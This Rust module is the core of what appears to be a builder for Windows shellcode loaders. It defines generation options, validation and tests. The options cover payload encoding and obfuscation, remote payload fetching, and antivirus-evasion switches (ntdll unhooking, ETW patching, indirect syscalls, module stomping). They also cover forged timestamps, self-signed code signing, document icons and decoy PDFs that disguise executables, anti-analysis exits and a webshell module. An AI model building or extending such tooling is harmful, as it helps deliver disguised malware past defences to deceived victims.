//! builder —— 构建器核心模块集合。
//!
//! 原先所有逻辑堆在一个 2000 行的 `main.rs` 里，改一处要翻很久，
//! 而且没法对单个环节写单元测试。这里按职责切分：
//!
//! | 子模块 | 职责 |
//! |---|---|
//! | [`tools`] | 外部工具探测（PATH + Homebrew 目录） |
//! | [`rng`] | 有状态 PRNG（支持 `MACLOADER_SEED` 复现） |
//! | [`hash`] | 无依赖 SHA-256（用于证书缓存与产物自审） |
//! | [`encode`] | payload 的各种 C 源码形态：UUID / Base64 / Base32 / 分块 |
//! | [`resource`] | 图标库、ico 转换、VERSIONINFO / manifest / 诱饵资源对象 |
//! | [`pe`] | PE 解析、时间戳伪造、文件时间、自审用的节表熵值 |
//! | [`sign`] | Authenticode 自签名证书与签名 |
//! | [`payload`] | payload 文本/二进制解析 |
//! | [`generate`] | 主生成流程（串起来上面所有环节） |
//! | [`variants`] | 变体矩阵（一次多变量对照） |
//! | [`inspect`] | 产物静态自审 |
//! | [`profile`] | 配置持久化（保存/加载/上次配置） |

pub mod encode;
pub mod generate;
pub mod hash;
pub mod inspect;
pub mod payload;
pub mod pe;
pub mod profile;
pub mod resource;
pub mod rng;
pub mod sign;
pub mod tools;
pub mod variants;
pub mod webshell;
pub mod wrap;

use serde::{Deserialize, Serialize};

/// 内置加载器源码（与本工程 `assets/loader.cpp` 同源）
pub const LOADER_SRC: &str = include_str!("../../assets/loader.cpp");

/// 图标库（来自 MaLoader/static，编译期嵌入二进制）
pub const LIB_ICONS: &[(&str, &[u8])] = &[
    ("excel", include_bytes!("../../icons/library/excel.ico")),
    ("notepad", include_bytes!("../../icons/library/notepad.ico")),
    ("pdf-2", include_bytes!("../../icons/library/pdf-2.ico")),
    ("pdf-3", include_bytes!("../../icons/library/pdf-3.ico")),
    ("pdf", include_bytes!("../../icons/library/pdf.ico")),
    ("ppt", include_bytes!("../../icons/library/ppt.ico")),
    ("word", include_bytes!("../../icons/library/word.ico")),
];

/// 当前版本号：与 `tauri.conf.json` 的 app.version 保持一致，
/// 在「关于」页与环境自检里显示。
pub const APP_VERSION: &str = env!("CARGO_PKG_VERSION");

/* ============================ 生成选项 ============================ */

#[derive(Deserialize, Clone, Serialize, Default)]
pub struct GenOpts {
    pub payload: String,
    pub out_dir: String,
    pub out_name: String,
    #[serde(default = "d_arch")]
    pub arch: String,
    #[serde(default = "d_enc")]
    pub encoding: String, // auto | uuid | b64 | b32 | chunk | chunk_r | raw
    #[serde(default = "d_true")]
    pub obfuscate: bool, // 编译期代码随机化
    #[serde(default = "d_mode")]
    pub mode: String,
    #[serde(default)]
    pub console: bool,
    #[serde(default)]
    pub xor_key: Option<u32>,
    #[serde(default = "d_load")]
    pub load_mode: String, // embed | remote
    #[serde(default)]
    pub remote_url: String,
    #[serde(default = "d_time")]
    pub time_mode: String, // none | custom | random
    #[serde(default = "d_timeval")]
    pub time_value: String,
    #[serde(default)]
    pub harden: Vec<String>, // unhook | etw | indirect | stomp | diskssn
    #[serde(default)]
    pub stomp_dll: String,
    #[serde(default = "d_true")]
    pub show_errors: bool,
    #[serde(default = "d_icon")]
    pub icon: String, // "" = 不挂 | "lib:<name>" | 任意 .ico/.png/.jpg 路径
    #[serde(default = "d_true")]
    pub res_full: bool, // 资源伪装：同时写入 VERSIONINFO + RT_MANIFEST
    #[serde(default)]
    pub decoy: String, // 诱饵 PDF 路径；非空则启用 PDF 伪装模式
    #[serde(default = "d_true")]
    pub sign: bool, // Authenticode 自签名（默认开）
    #[serde(default = "d_tsa")]
    pub tsa_url: String,
    // 空串 = 未指定 → 生成时按图标预设自动推导（见 resource::resolve_subject），
    // 以保证签名者与 VERSIONINFO 的 CompanyName 一致。
    #[serde(default)]
    pub cert_subject: String,
    #[serde(default = "d_prot")]
    pub protect: String, // rx（默认）| rwx | auto
    #[serde(default)]
    pub anti_strict: bool, // 反分析遇可疑环境时退出（而非仅记录）
}

pub fn d_arch() -> String {
    "x64".into()
}
pub fn d_enc() -> String {
    "chunk".into()
}
pub fn d_mode() -> String {
    "direct".into()
}
pub fn d_load() -> String {
    "embed".into()
}
pub fn d_time() -> String {
    "random".into()
}
pub fn d_timeval() -> String {
    "2024-11-15T08:30".into()
}
pub fn d_true() -> bool {
    true
}
pub fn d_icon() -> String {
    "lib:notepad".into()
}
pub fn d_tsa() -> String {
    "http://tsa.wotrus.com".into()
}
pub fn d_prot() -> String {
    "rx".into()
}

/* ============================ 返回值 ============================ */

#[derive(Serialize, Clone)]
pub struct GenResult {
    pub ok: bool,
    pub log: String,
    pub output: String,
    pub size: u64,
    pub uuid_count: usize,
    pub key: u8,
    pub payload_file: String,
    pub time_ts: u32,
    /// 产物 sha256，便于横向比对变体
    pub sha256: String,
    /// payload 原文 sha256（脱敏前），用于确认两次构建喂的是同一份数据
    pub payload_sha256: String,
}

#[derive(Serialize)]
pub struct EnvInfo {
    pub x64: String,
    pub x86: String,
    pub windres: String,
    pub openssl: String,
    pub osslsigncode: String,
    pub brew: String,
}

#[derive(Serialize)]
pub struct FileItem {
    pub name: String,
    pub path: String,
    pub size: u64,
    pub mtime: u64,
}

/* ============================ 合法取值 ============================ */
/* CLI、GUI、变体矩阵三处都要校验，集中放在这里避免各自漂移。 */

pub const ARCH_VALUES: &[&str] = &["x64", "x86"];
pub const ENC_VALUES: &[&str] = &["auto", "uuid", "b64", "b32", "chunk", "chunk_r", "raw"];
pub const MODE_VALUES: &[&str] = &["direct", "fiber", "callback"];
pub const LOAD_VALUES: &[&str] = &["embed", "remote"];
pub const TIME_VALUES: &[&str] = &["none", "custom", "random"];
pub const PROT_VALUES: &[&str] = &["rx", "rwx", "auto"];
// diskssn: 内存 ntdll 被 hook 时改从磁盘干净副本解析 SSN。
// 注意：与 unhook/etw/indirect/stomp 一样，实测在 360 环境下有触发风险，
// 保持默认关闭（需显式 --harden diskssn 才启用）。
pub const HARDEN_VALUES: &[&str] = &["unhook", "etw", "indirect", "stomp", "diskssn"];

/// 校验所有枚举字段。返回第一个非法项的可读描述。
pub fn validate(opts: &GenOpts) -> Result<(), String> {
    let all = [
        ("arch", &opts.arch, ARCH_VALUES),
        ("encoding", &opts.encoding, ENC_VALUES),
        ("mode", &opts.mode, MODE_VALUES),
        ("load_mode", &opts.load_mode, LOAD_VALUES),
        ("time_mode", &opts.time_mode, TIME_VALUES),
        ("protect", &opts.protect, PROT_VALUES),
    ];
    for (f, v, allowed) in all {
        if !allowed.iter().any(|a| a == v) {
            return Err(format!("{f} 的值无效: {v} (允许: {})", allowed.join("|")));
        }
    }
    for h in &opts.harden {
        if !HARDEN_VALUES.iter().any(|a| a == h) {
            return Err(format!(
                "harden 的值无效: {h} (允许: {})",
                HARDEN_VALUES.join("|")
            ));
        }
    }
    Ok(())
}

/// Validate a user-supplied output filename before joining it to a directory.
///
/// `Path::join` accepts path separators and absolute paths, so validating only
/// the directory is not enough to keep generated files inside the selected
/// output folder.
pub fn validate_output_file_name(name: &str) -> Result<(), String> {
    let name = name.trim();
    if name.is_empty() {
        return Err("输出文件名不能为空".into());
    }
    if name == "." || name == ".." || name.contains('/') || name.contains('\\') {
        return Err("输出文件名不能包含路径分隔符或指向父目录".into());
    }
    if name.chars().any(char::is_control) {
        return Err("输出文件名不能包含控制字符".into());
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn defaults_are_valid() {
        // Default + 兜底默认值混出来的配置必须能通过校验，
        // 否则 GUI 首次打开就可能拿到非法组合。
        let mut o = GenOpts::default();
        o.arch = d_arch();
        o.encoding = d_enc();
        o.mode = d_mode();
        o.load_mode = d_load();
        o.time_mode = d_time();
        o.protect = d_prot();
        validate(&o).expect("默认配置必须合法");
    }

    #[test]
    fn rejects_bad_enum() {
        let mut o = GenOpts::default();
        o.arch = "arm64".into();
        o.encoding = d_enc();
        o.mode = d_mode();
        o.load_mode = d_load();
        o.time_mode = d_time();
        o.protect = d_prot();
        let e = validate(&o).expect_err("非法 arch 必须被拒");
        assert!(e.contains("arch"), "{e}");
    }

    #[test]
    fn output_file_name_rejects_path_escapes() {
        for name in ["../escape.exe", "dir/escape.exe", "dir\\escape.exe", "/tmp/escape.exe", ".", "..", ""] {
            assert!(
                validate_output_file_name(name).is_err(),
                "应拒绝输出文件名: {name:?}"
            );
        }
    }

    #[test]
    fn output_file_name_accepts_regular_names() {
        for name in ["loader.exe", "报告.exe", "shell.php", "a-b_c.ico"] {
            validate_output_file_name(name).expect("普通文件名应通过校验");
        }
    }

    #[test]
    fn icon_library_names_are_unique() {
        let mut seen = Vec::new();
        for (n, b) in LIB_ICONS {
            assert!(!seen.contains(n), "重复图标名: {n}");
            seen.push(*n);
            assert!(b.len() > 64, "图标 {n} 体积异常: {} bytes", b.len());
        }
    }
}
